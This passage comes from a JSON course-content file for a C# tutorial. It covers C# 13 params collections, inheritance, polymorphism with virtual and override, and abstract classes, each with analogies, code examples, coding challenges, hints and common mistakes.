                  "mistake": "When to use static",
                  "consequence": "Use static for shared data (counters, constants) or utility methods (Math.Sqrt). Use instance for object-specific data (each player's score).",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-06-08",
          "title": "Flexible Parameters with params Collections (C# 13)",
          "moduleId": "module-06",
          "order": 8,
          "estimatedMinutes": 12,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine a pizza shop that accepts orders differently: 'I want pepperoni, mushrooms, olives' (listing items), or 'Here's my written list' (handing a paper), or 'Use my usual order' (referencing saved preferences). C# 13's enhanced params keyword works the same way - it accepts items inline, as collection expressions, or from existing collections!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "C# 13 extends params to work with any collection type, not just arrays. This gives you flexible calling patterns.",
              "code": "// C# 13: params works with IEnumerable<T>, Span<T>, and more!\nvoid PrintAll(params IEnumerable<string> items)\n{\n    foreach (var item in items)\n        Console.WriteLine(item);\n}\n\n// Three ways to call the same method:\nPrintAll(\"apple\", \"banana\", \"cherry\");     // Inline items\nPrintAll([\"one\", \"two\", \"three\"]);         // Collection expression\n\nvar myList = new List<string> { \"red\", \"green\", \"blue\" };\nPrintAll(myList);                           // Existing collection\n\n// Works with Span<T> for performance!\nvoid ProcessFast(params ReadOnlySpan<int> numbers)\n{\n    var sum = 0;\n    foreach (var n in numbers)\n        sum += n;\n    Console.WriteLine($\"Sum: {sum}\");\n}\n\nProcessFast(1, 2, 3, 4, 5);  // No allocation!",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "**Before C# 13** - params only worked with arrays:\n`void Method(params string[] items)`\n\n**C# 13 Enhancement** - params works with:\n- `params IEnumerable<T>` - Any enumerable\n- `params ReadOnlySpan<T>` - Stack-allocated, zero-copy\n- `params IReadOnlyList<T>` - Indexed access\n- `params IReadOnlyCollection<T>` - With count\n\n**Key Benefits:**\n1. **Flexibility**: Callers can pass inline items, collection expressions, or existing collections\n2. **Performance**: Span<T> avoids heap allocations\n3. **Interoperability**: Works with any collection type the caller already has"
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "**params must be the last parameter!** You can't have `void Method(params string[] items, int count)` - params must come last in the parameter list.\n\n**Don't combine params with ref/out/in!** Modifiers like `ref`, `out`, and `in` cannot be used with params parameters.\n\n**Requires .NET 9 / C# 13!** The enhanced params collections feature requires C# 13 and .NET 9. Older projects still need `params T[]` arrays.\n\n**No default values for params!** You cannot write `params string[] items = null` - params parameters cannot have default values.\n\n**Overload resolution changes:** With multiple collection types supported, be careful about overload ambiguity. The compiler picks based on argument types."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-06-08-challenge-01",
              "title": "Build a Flexible Logger",
              "description": "Create a logging method that accepts messages in multiple ways using C# 13 params.",
              "instructions": "1. Create a method `LogMessages` that takes `params IEnumerable<string> messages`\n2. Print each message with a timestamp prefix\n3. Test with inline items, collection expression, and an existing list",
              "starterCode": "// TODO: Create LogMessages method with params IEnumerable<string>\n\n// Test all three calling patterns:\n// 1. Inline: LogMessages(\"Starting\", \"Processing\", \"Done\");\n// 2. Collection expression: LogMessages([\"Error\", \"Warning\"]);\n// 3. Existing list: var logs = new List<string> {...}; LogMessages(logs);",
              "solution": "void LogMessages(params IEnumerable<string> messages)\n{\n    foreach (var msg in messages)\n        Console.WriteLine($\"[{DateTime.Now:HH:mm:ss}] {msg}\");\n}\n\n// Test inline items\nLogMessages(\"Starting\", \"Processing\", \"Done\");\n\n// Test collection expression\nLogMessages([\"Error occurred\", \"Retrying...\"]);\n\n// Test existing collection\nvar logs = new List<string> { \"Init\", \"Load\", \"Complete\" };\nLogMessages(logs);",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-params-inline",
                  "description": "Method accepts inline string arguments",
                  "expectedOutput": "Three timestamped log lines",
                  "isVisible": true
                },
                {
                  "id": "test-params-collection",
                  "description": "Method accepts collection expression",
                  "expectedOutput": "Two timestamped log lines",
                  "isVisible": true
                },
                {
                  "id": "test-params-list",
                  "description": "Method accepts existing List<string>",
                  "expectedOutput": "Three timestamped log lines",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use `params IEnumerable<string>` not `params string[]`"
                },
                {
                  "level": 2,
                  "text": "foreach works the same way on IEnumerable as on arrays"
                }
              ],
              "commonMistakes": [
                {
                  "id": "mistake-1",
                  "mistake": "Using params string[] instead of params IEnumerable<string>",
                  "consequence": "Callers must convert existing collections to arrays before passing them",
                  "correction": "C# 13 extends params to work with IEnumerable<T>. This allows callers to pass existing collections without conversion."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        }
      ]
    },
    {
      "id": "module-07",
      "title": "Object-Oriented Programming Basics",
      "description": "Introduction to classes, objects, properties, constructors, and the fundamentals of OOP.",
      "difficulty": "beginner",
      "estimatedHours": 2,
      "lessons": [
        {
          "id": "lesson-07-01",
          "title": "Inheritance (Blueprints Based on Blueprints)",
          "moduleId": "module-07",
          "order": 1,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine a car factory has a 'Vehicle' blueprint with wheels, engine, steering. Now they want to make a 'Car' - instead of starting from scratch, they say: 'Take the Vehicle blueprint and ADD doors, trunk, and seats!'\n\nThat's INHERITANCE! You create a new class BASED ON an existing one:\n• The original class = BASE CLASS (or parent, superclass)\n• The new class = DERIVED CLASS (or child, subclass)\n\nThe derived class INHERITS everything from the base class and can ADD NEW features or MODIFY existing ones.\n\nExample: Animal (base) → Dog (derived)\n• Animal has: Name, Age, Eat(), Sleep()\n• Dog inherits ALL of those AND adds: Breed, Bark()\n\nInheritance promotes CODE REUSE - don't repeat yourself! Write common features once in the base class, share with all derived classes."
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// BASE CLASS\nclass Vehicle\n{\n    public string Brand;\n    public int Year;\n    \n    public void Start()\n    {\n        Console.WriteLine(Brand + \" vehicle starting...\");\n    }\n    \n    public void Stop()\n    {\n        Console.WriteLine(\"Vehicle stopping.\");\n    }\n}\n\n// DERIVED CLASS - inherits from Vehicle\nclass Car : Vehicle  // ':' means 'inherits from'\n{\n    public int Doors;  // NEW feature\n    public string Model;\n    \n    public void OpenTrunk()\n    {\n        Console.WriteLine(\"Trunk opened!\");\n    }\n}\n\nclass Motorcycle : Vehicle\n{\n    public bool HasSidecar;\n    \n    public void Wheelie()\n    {\n        Console.WriteLine(\"Doing a wheelie!\");\n    }\n}\n\n// Usage\nCar myCar = new Car();\nmyCar.Brand = \"Toyota\";  // Inherited from Vehicle!\nmyCar.Year = 2020;       // Inherited from Vehicle!\nmyCar.Doors = 4;         // Car's own property\nmyCar.Start();           // Inherited method\nmyCar.OpenTrunk();       // Car's own method\n\nMotorcycle bike = new Motorcycle();\nbike.Brand = \"Harley\";   // Also inherited from Vehicle\nbike.Start();            // Inherited\nbike.Wheelie();          // Motorcycle's own method",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`class Car : Vehicle`**: The colon ':' means 'inherits from'. Car is the DERIVED class, Vehicle is the BASE class. Car gets ALL of Vehicle's members automatically!\n\n**`Inherited members`**: Car automatically has Brand, Year, Start(), Stop() even though you didn't write them! They come from Vehicle. You can use them immediately on Car objects.\n\n**`Adding new members`**: Derived classes can ADD new fields, properties, and methods. Car adds Doors and OpenTrunk(). Base class (Vehicle) doesn't have these!\n\n**`Single inheritance`**: In C#, a class can only inherit from ONE base class! Can't do 'class Car : Vehicle, Machine'. But you can chain: Vehicle → Car → SportsCar."
            },
            {
              "type": "WARNING",
              "title": "Important Considerations",
              "content": "## Constructor Chaining with base()\n\nWhen a base class has a constructor with parameters, derived classes MUST call it using `base()`:\n\n```csharp\nclass Animal\n{\n    public string Name;\n    public Animal(string name)  // Constructor with parameter\n    {\n        Name = name;\n    }\n}\n\nclass Dog : Animal\n{\n    public string Breed;\n    \n    // MUST call base constructor!\n    public Dog(string name, string breed) : base(name)\n    {\n        Breed = breed;\n    }\n}\n\nvar dog = new Dog(\"Buddy\", \"Golden Retriever\");\n```\n\n**Common pitfalls:**\n- Forgetting to call `base()` when base class has no parameterless constructor\n- Deep inheritance hierarchies (3+ levels) - harder to maintain!\n- Using inheritance for code reuse when composition would be better\n\n**The 'protected' access modifier:**\n- `private`: Only the declaring class can access\n- `protected`: Declaring class AND derived classes can access\n- `public`: Anyone can access\n\nUse `protected` for members that derived classes need but shouldn't be public!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-07-01-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create an animal hierarchy!\n\n1. BASE CLASS 'Animal':\n   - Properties: string Name, int Age\n   - Method Eat(): prints '[Name] is eating'\n   - Method Sleep(): prints '[Name] is sleeping'\n\n2. DERIVED CLASS 'Dog' inherits Animal:\n   - Add property: string Breed\n   - Add method Bark(): prints 'Woof!'\n\n3. DERIVED CLASS 'Cat' inherits Animal:\n   - Add property: string Color\n   - Add method Meow(): prints 'Meow!'\n\n4. Create a Dog and a Cat, set their properties, call all methods (inherited and own)",
              "starterCode": "// Base class Animal\nclass Animal\n{\n    // Add properties and methods\n}\n\n// Derived class Dog\nclass Dog : Animal\n{\n    // Add Dog-specific members\n}\n\n// Derived class Cat\nclass Cat : Animal\n{\n    // Add Cat-specific members\n}\n\n// Create animals and test\nDog dog = new Dog();\nCat cat = new Cat();",
              "solution": "class Animal\n{\n    public string Name;\n    public int Age;\n    \n    public void Eat()\n    {\n        Console.WriteLine(Name + \" is eating\");\n    }\n    \n    public void Sleep()\n    {\n        Console.WriteLine(Name + \" is sleeping\");\n    }\n}\n\nclass Dog : Animal\n{\n    public string Breed;\n    \n    public void Bark()\n    {\n        Console.WriteLine(\"Woof!\");\n    }\n}\n\nclass Cat : Animal\n{\n    public string Color;\n    \n    public void Meow()\n    {\n        Console.WriteLine(\"Meow!\");\n    }\n}\n\nDog dog = new Dog();\ndog.Name = \"Buddy\";\ndog.Age = 3;\ndog.Breed = \"Golden Retriever\";\ndog.Eat();    // Inherited!\ndog.Bark();   // Dog's own\n\nCat cat = new Cat();\ncat.Name = \"Whiskers\";\ncat.Age = 2;\ncat.Color = \"Orange\";\ncat.Eat();    // Inherited!\ncat.Meow();   // Cat's own",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"eating\"",
                  "expectedOutput": "eating",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Woof\"",
                  "expectedOutput": "Woof",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"Meow\"",
                  "expectedOutput": "Meow",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use 'class Derived : Base' syntax. Derived class automatically gets all Base members. Add new members in the derived class body."
                },
                {
                  "level": 2,
                  "text": "Forgetting the colon: 'class Dog Animal' is WRONG! Must be 'class Dog : Animal' with the colon to inherit."
                },
                {
                  "level": 3,
                  "text": "Trying to inherit from multiple classes: C# doesn't support multiple inheritance! 'class Dog : Animal, Pet' is ERROR. Can only inherit from ONE class."
                },
                {
                  "level": 4,
                  "text": "Redefining inherited members: If Dog has 'public string Name;' and Animal already has it, Dog gets TWO Name fields (confusing!). Don't redefine - just use the inherited one!"
                },
                {
                  "level": 5,
                  "text": "Access modifiers: Derived class can't access PRIVATE members of base class! Use protected or public in base class if derived class needs access."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting the colon",
                  "consequence": "'class Dog Animal' is WRONG! Must be 'class Dog : Animal' with the colon to inherit.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Trying to inherit from multiple classes",
                  "consequence": "C# doesn't support multiple inheritance! 'class Dog : Animal, Pet' is ERROR. Can only inherit from ONE class.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Redefining inherited members",
                  "consequence": "If Dog has 'public string Name;' and Animal already has it, Dog gets TWO Name fields (confusing!). Don't redefine - just use the inherited one!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Access modifiers",
                  "consequence": "Derived class can't access PRIVATE members of base class! Use protected or public in base class if derived class needs access.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-07-02",
          "title": "Polymorphism (virtual & override)",
          "moduleId": "module-07",
          "order": 2,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine different types of phones all have a 'Ring' button, but each rings DIFFERENTLY! iPhone plays a melody, Android buzzes, old Nokia has the classic ringtone. Same button name, different behaviors!\n\nThat's POLYMORPHISM (meaning 'many forms')! A method in the base class can be OVERRIDDEN in derived classes to provide different implementations.\n\nIn the base class, mark methods as 'virtual' (can be overridden). In derived classes, use 'override' to provide new implementation.\n\nExample: Animal.MakeSound() is virtual. Dog overrides it to 'Woof!', Cat overrides it to 'Meow!'. Same method name, different sounds - that's polymorphism in action!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "class Animal\n{\n    public string Name;\n    \n    // VIRTUAL method - can be overridden\n    public virtual void MakeSound()\n    {\n        Console.WriteLine(\"Some generic animal sound\");\n    }\n    \n    public virtual void Move()\n    {\n        Console.WriteLine(Name + \" is moving\");\n    }\n}\n\nclass Dog : Animal\n{\n    // OVERRIDE the base method\n    public override void MakeSound()\n    {\n        Console.WriteLine(\"Woof! Woof!\");\n    }\n    \n    public override void Move()\n    {\n        Console.WriteLine(Name + \" is running on four legs\");\n    }\n}\n\nclass Bird : Animal\n{\n    public override void MakeSound()\n    {\n        Console.WriteLine(\"Tweet tweet!\");\n    }\n    \n    public override void Move()\n    {\n        Console.WriteLine(Name + \" is flying\");\n    }\n}\n\n// Polymorphism in action\nAnimal animal1 = new Dog();\nAnimal animal2 = new Bird();\n\nanimal1.MakeSound();  // Calls Dog's version: Woof!\nanimal2.MakeSound();  // Calls Bird's version: Tweet!\n\n// Even though both are declared as Animal, \n// they call their ACTUAL type's method!",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`public virtual void Method()`**: 'virtual' in base class means 'derived classes CAN override this'. Without virtual, derived classes can't override (they can hide with 'new', but that's different).\n\n**`public override void Method()`**: 'override' in derived class replaces the base class implementation. Signature (name, parameters, return type) MUST match exactly!\n\n**`Animal dog = new Dog();`**: You can store a derived type in a base type variable! This is polymorphism - the variable is Animal, but the object is Dog. Calls Dog's methods!\n\n**`base.Method()`**: In override method, use 'base.Method()' to call the BASE class version. Useful when you want to EXTEND, not REPLACE."
            },
            {
              "type": "WARNING",
              "title": "Important Considerations",
              "content": "## new vs override - They're NOT the Same!\n\nThe `new` keyword HIDES a base method instead of overriding it. This breaks polymorphism!\n\n```csharp\nclass Animal\n{\n    public virtual void Speak() => Console.WriteLine(\"...\");\n}\n\nclass Dog : Animal\n{\n    public override void Speak() => Console.WriteLine(\"Woof!\");  // Polymorphic!\n}\n\nclass Cat : Animal\n{\n    public new void Speak() => Console.WriteLine(\"Meow!\");  // HIDES - danger!\n}\n\nAnimal dog = new Dog();\nAnimal cat = new Cat();\n\ndog.Speak();  // \"Woof!\" - override works!\ncat.Speak();  // \"...\" - new DOESN'T work polymorphically!\n\n// Cat only meows when variable is Cat type:\nCat realCat = new Cat();\nrealCat.Speak();  // \"Meow!\"\n```\n\n**Key rules:**\n- Always use `override` for polymorphic behavior\n- `new` is rarely the right choice (it's usually a code smell)\n- Compiler warning CS0114 means you need `override` or `new`\n\n**Calling base implementation:**\n```csharp\npublic override void Speak()\n{\n    base.Speak();  // Call base class version first\n    Console.WriteLine(\"Woof!\");  // Then add to it\n}\n```"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-07-02-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a shape hierarchy with polymorphic Area calculation!\n\n1. BASE CLASS 'Shape':\n   - virtual method CalculateArea() returns double, returns 0\n   - virtual method Display() prints shape info\n\n2. DERIVED 'Circle' : Shape\n   - Property: double Radius\n   - Override CalculateArea(): return Math.PI * Radius * Radius\n   - Override Display(): print 'Circle with radius [r]'\n\n3. DERIVED 'Rectangle' : Shape\n   - Properties: double Width, double Height\n   - Override CalculateArea(): return Width * Height\n   - Override Display(): print 'Rectangle [w]x[h]'\n\n4. Create array of Shape, store Circle and Rectangle, call methods polymorphically",
              "starterCode": "class Shape\n{\n    public virtual double CalculateArea()\n    {\n        return 0;\n    }\n    \n    public virtual void Display()\n    {\n        Console.WriteLine(\"Generic shape\");\n    }\n}\n\nclass Circle : Shape\n{\n    public double Radius;\n    // Override methods\n}\n\nclass Rectangle : Shape\n{\n    public double Width;\n    public double Height;\n    // Override methods\n}\n\n// Create shapes polymorphically",
              "solution": "class Shape\n{\n    public virtual double CalculateArea()\n    {\n        return 0;\n    }\n    \n    public virtual void Display()\n    {\n        Console.WriteLine(\"Generic shape\");\n    }\n}\n\nclass Circle : Shape\n{\n    public double Radius;\n    \n    public override double CalculateArea()\n    {\n        return Math.PI * Radius * Radius;\n    }\n    \n    public override void Display()\n    {\n        Console.WriteLine(\"Circle with radius \" + Radius);\n    }\n}\n\nclass Rectangle : Shape\n{\n    public double Width;\n    public double Height;\n    \n    public override double CalculateArea()\n    {\n        return Width * Height;\n    }\n    \n    public override void Display()\n    {\n        Console.WriteLine(\"Rectangle \" + Width + \"x\" + Height);\n    }\n}\n\nShape[] shapes = new Shape[2];\nshapes[0] = new Circle() { Radius = 5 };\nshapes[1] = new Rectangle() { Width = 4, Height = 6 };\n\nforeach (Shape shape in shapes)\n{\n    shape.Display();\n    Console.WriteLine(\"Area: \" + shape.CalculateArea());\n}",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Circle\"",
                  "expectedOutput": "Circle",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Rectangle\"",
                  "expectedOutput": "Rectangle",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"Area\"",
                  "expectedOutput": "Area",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Base class: mark methods 'virtual'. Derived: mark 'override' with same signature. Store derived objects in base type variable for polymorphism."
                },
                {
                  "level": 2,
                  "text": "Forgetting 'virtual' in base: If base method isn't 'virtual', you can't 'override' it! You get a compiler error: 'cannot override inherited member because it is not marked virtual'."
                },
                {
                  "level": 3,
                  "text": "Signature mismatch: Override MUST match exactly! 'public override int Method()' can't override 'public virtual void Method()'. Return type, name, parameters must be identical."
                },
                {
                  "level": 4,
                  "text": "Using 'new' instead of 'override': 'public new void Method()' HIDES the base method, doesn't override! This breaks polymorphism. Always use 'override' for polymorphic behavior."
                },
                {
                  "level": 5,
                  "text": "Not storing in base type: If you do 'Dog dog = new Dog()', polymorphism works but isn't as useful. Store in base type: 'Animal animal = new Dog()' to leverage polymorphism fully."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting 'virtual' in base",
                  "consequence": "If base method isn't 'virtual', you can't 'override' it! You get a compiler error: 'cannot override inherited member because it is not marked virtual'.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Signature mismatch",
                  "consequence": "Override MUST match exactly! 'public override int Method()' can't override 'public virtual void Method()'. Return type, name, parameters must be identical.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Using 'new' instead of 'override'",
                  "consequence": "'public new void Method()' HIDES the base method, doesn't override! This breaks polymorphism. Always use 'override' for polymorphic behavior.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Not storing in base type",
                  "consequence": "If you do 'Dog dog = new Dog()', polymorphism works but isn't as useful. Store in base type: 'Animal animal = new Dog()' to leverage polymorphism fully.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-07-03",
          "title": "Abstract Classes (The Unfinished Blueprint)",
          "moduleId": "module-07",
          "order": 3,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine an architect creates a 'Building' blueprint but leaves some parts intentionally blank: 'Each building MUST have an entrance, but I'm not specifying what kind - you figure that out!'\n\nThat's an ABSTRACT CLASS! It's an INCOMPLETE blueprint that:\n• CAN'T be instantiated directly (can't create a 'Building' object)\n• MUST be inherited\n• Can have ABSTRACT methods (no implementation - derived classes MUST provide it)\n• Can also have regular (concrete) methods with full implementation\n\nWhen to use: When classes share common features, but some features don't make sense in the base class. 'Animal.MakeSound()' - what sound does a generic animal make? Doesn't make sense! Make it abstract - force Dog, Cat to implement it.\n\nAbstract = 'Template with mandatory blanks to fill in'."
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// ABSTRACT CLASS - can't be instantiated\nabstract class Shape\n{\n    public string Color;  // Regular property\n    \n    // ABSTRACT method - no implementation!\n    public abstract double CalculateArea();\n    \n    // ABSTRACT method\n    public abstract double CalculatePerimeter();\n    \n    // Regular (concrete) method\n    public void Display()\n    {\n        Console.WriteLine(Color + \" shape with area: \" + CalculateArea());\n    }\n}\n\n// Derived class MUST implement abstract methods\nclass Circle : Shape\n{\n    public double Radius;\n    \n    // MUST override abstract methods\n    public override double CalculateArea()\n    {\n        return Math.PI * Radius * Radius;\n    }\n    \n    public override double CalculatePerimeter()\n    {\n        return 2 * Math.PI * Radius;\n    }\n}\n\nclass Rectangle : Shape\n{\n    public double Width, Height;\n    \n    public override double CalculateArea()\n    {\n        return Width * Height;\n    }\n    \n    public override double CalculatePerimeter()\n    {\n        return 2 * (Width + Height);\n    }\n}\n\n// Usage\n// Shape s = new Shape();  // ERROR! Can't instantiate abstract class\nShape circle = new Circle() { Radius = 5, Color = \"Red\" };\ncircle.Display();  // Inherited method works!",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`abstract class ClassName`**: 'abstract' keyword makes class abstract. Can't do 'new ClassName()' - you MUST inherit and use derived classes.\n\n**`public abstract void Method();`**: Abstract method has NO BODY (no { }), just semicolon! Derived classes MUST override and provide implementation. Like a contract: 'you must implement this!'\n\n**`Concrete methods in abstract class`**: Abstract classes CAN have regular methods with implementation! Mix of abstract (must override) and concrete (inherited as-is) methods is common.\n\n**`Forcing implementation`**: If you inherit from abstract class, compiler FORCES you to override all abstract methods! Forget one = compile error. This ensures consistency."
            },
            {
              "type": "WARNING",
              "title": "Important Considerations",
              "content": "## Abstract Classes Can Have Constructors!\n\nEven though you can't instantiate an abstract class directly, it CAN have a constructor. Derived classes call it via `base()`:\n\n```csharp\nabstract class Animal\n{\n    public string Name { get; }\n    \n    // Constructor in abstract class!\n    protected Animal(string name)\n    {\n        Name = name;\n    }\n    \n    public abstract void Speak();\n}\n\nclass Dog : Animal\n{\n    public Dog(string name) : base(name) { }  // Must call base!\n    public override void Speak() => Console.WriteLine($\"{Name} says Woof!\");\n}\n\nvar dog = new Dog(\"Buddy\");  // Works!\n// var animal = new Animal(\"?\");  // ERROR - can't instantiate abstract!\n```\n\n**Abstract vs Virtual:**\n- `abstract`: NO implementation, derived classes MUST override\n- `virtual`: HAS implementation, derived classes CAN override\n\n**When to use abstract classes:**\n- You have shared code (constructors, fields, methods)\n- You want to force derived classes to implement specific methods\n- There's a clear IS-A relationship in your hierarchy\n\n**Abstract class gotchas:**\n- Can only inherit from ONE abstract class (single inheritance)\n- If a derived class is also abstract, it doesn't need to implement abstract methods\n- Abstract properties and indexers are also supported!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-07-03-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create an abstract Employee system!\n\n1. ABSTRACT CLASS 'Employee':\n   - Properties: string Name, int ID\n   - ABSTRACT method CalculateSalary() returns decimal\n   - Regular method Display(): prints employee info and salary\n\n2. DERIVED 'HourlyEmployee':\n   - Properties: decimal HourlyRate, int HoursWorked\n   - Override CalculateSalary(): return HourlyRate * HoursWorked\n\n3. DERIVED 'SalariedEmployee':\n   - Property: decimal AnnualSalary\n   - Override CalculateSalary(): return AnnualSalary / 12 (monthly)\n\n4. Create both types, call Display()",
              "starterCode": "abstract class Employee\n{\n    public string Name;\n    public int ID;\n    \n    // Abstract method\n    \n    // Regular method\n    public void Display()\n    {\n        Console.WriteLine(Name + \" (ID: \" + ID + \")\");\n        Console.WriteLine(\"Salary: $\" + CalculateSalary());\n    }\n}\n\nclass HourlyEmployee : Employee\n{\n    // Properties and override\n}\n\nclass SalariedEmployee : Employee\n{\n    // Properties and override\n}",
              "solution": "abstract class Employee\n{\n    public string Name;\n    public int ID;\n    \n    public abstract decimal CalculateSalary();\n    \n    public void Display()\n    {\n        Console.WriteLine(Name + \" (ID: \" + ID + \")\");\n        Console.WriteLine(\"Salary: $\" + CalculateSalary());\n    }\n}\n\nclass HourlyEmployee : Employee\n{\n    public decimal HourlyRate;\n    public int HoursWorked;\n    \n    public override decimal CalculateSalary()\n    {\n        return HourlyRate * HoursWorked;\n    }\n}\n\nclass SalariedEmployee : Employee\n{\n    public decimal AnnualSalary;\n    \n    public override decimal CalculateSalary()\n    {\n        return AnnualSalary / 12;\n    }\n}\n\nHourlyEmployee emp1 = new HourlyEmployee();\nemp1.Name = \"John\";\nemp1.ID = 101;\nemp1.HourlyRate = 25;\nemp1.HoursWorked = 160;\nemp1.Display();\n\nSalariedEmployee emp2 = new SalariedEmployee();\nemp2.Name = \"Jane\";\nemp2.ID = 102;\nemp2.AnnualSalary = 60000;\nemp2.Display();",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Salary\"",
                  "expectedOutput": "Salary",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"ID\"",
                  "expectedOutput": "ID",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Abstract class: 'abstract class Name'. Abstract method: 'public abstract ReturnType Method();' (no body!). Derived MUST override abstract methods."
                },
                {
                  "level": 2,
                  "text": "Trying to instantiate abstract class: 'Employee e = new Employee();' is ERROR! Abstract classes can't be created directly - use derived classes."
                },
                {
                  "level": 3,
                  "text": "Forgetting to override abstract methods: If you inherit from abstract class, you MUST override all abstract methods! Compiler will complain if you don't."
                },
                {
                  "level": 4,
                  "text": "Adding body to abstract method: 'public abstract void Method() { }' is WRONG! Abstract methods don't have bodies - just the declaration with semicolon."
                },
                {
                  "level": 5,
                  "text": "When to use abstract vs interface: Use abstract class when you have SOME shared implementation. Use interface (next lesson) when you have NO implementation, just a contract."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Trying to instantiate abstract class",
                  "consequence": "'Employee e = new Employee();' is ERROR! Abstract classes can't be created directly - use derived classes.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting to override abstract methods",
                  "consequence": "If you inherit from abstract class, you MUST override all abstract methods! Compiler will complain if you don't.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Adding body to abstract method",
                  "consequence": "'public abstract void Method() { }' is WRONG! Abstract methods don't have bodies - just the declaration with semicolon.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "When to use abstract vs interface",
                  "consequence": "Use abstract class when you have SOME shared implementation. Use interface (next lesson) when you have NO implementation, just a contract.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-07-04",
          "title": "Interfaces (The Contract)",
          "moduleId": "module-07",
          "order": 4,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine a job posting: 'Looking for employee who can: Drive, Operate forklift, Read inventory systems.' This is a CONTRACT - if you want the job, you MUST have these skills!\n\nAn INTERFACE is a contract for classes. It says: 'If you implement me, you MUST provide these methods.' Unlike abstract classes:\n• NO implementation (just method signatures)\n• A class can implement MULTIPLE interfaces (but only inherit from ONE class!)\n• All members are public and abstract by default\n\nNaming: Interfaces start with 'I' by convention: IDrawable, IPlayable, IComparable.\n\nThink: IDrawable = 'anything that can be drawn'. Button, Image, Shape all implement IDrawable. They're completely different, but share the ability to be drawn!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
